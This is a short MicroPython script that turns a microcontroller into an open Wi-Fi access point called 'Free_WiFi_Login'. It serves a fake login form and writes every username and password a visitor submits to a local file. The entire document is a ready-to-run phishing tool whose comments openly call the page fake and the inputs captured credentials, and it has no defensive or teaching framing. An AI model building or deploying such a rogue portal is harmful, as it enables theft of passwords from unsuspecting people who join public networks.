import network
import socket
import time
import random

# Configuration
ssid = "Free_WiFi_Login"
password = ""
channel = 6

# Start the Access Point
ap = network.WLAN(network.AP_IF)
ap.active(True)
ap.config(essid=ssid, password=password, channel=channel)

print("Access Point started:", ssid)

# Simple fake login HTML
html = """<!DOCTYPE html>
<html>
<head><title>Free Wi-Fi Login</title></head>
<body style="text-align:center; font-family:sans-serif;">
<h2>Welcome to Free Wi-Fi</h2>
<form action="/" method="post">
Username:<br><input type="text" name="username"><br><br>
Password:<br><input type="password" name="password"><br><br>
<input type="submit" value="Login">
</form>
</body>
</html>
"""

# Start a simple HTTP server
addr = socket.getaddrinfo('0.0.0.0', 80)[0][-1]
s = socket.socket()
s.bind(addr)
s.listen(1)

print("HTTP Server started on 0.0.0.0:80")

def handle_client(client):
    try:
        request = client.recv(1024)
        request = request.decode()
        print("\n=== Incoming request ===")
        print(request)
        
        if "POST" in request:
            # Parse submitted data
            body = request.split("\r\n\r\n")[1]
            params = {}
            for pair in body.split("&"):
                key, value = pair.split("=")
                params[key] = value
            
            username = params.get("username", "unknown")
            password = params.get("password", "unknown")

            print("\n=== Captured Credentials ===")
            print("Username:", username)
            print("Password:", password)

            # Save credentials to a file
            with open('credentials.txt', 'a') as f:
                f.write(f"Username: {username} | Password: {password}\n")
        
        # Always respond with the fake login page
        response = 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n' + html
        client.send(response)
        
    except Exception as e:
        print("Error handling client:", e)
    finally:
        client.close()

# Main server loop
while True:
    client, addr = s.accept()
    print("New connection from", addr)
    handle_client(client)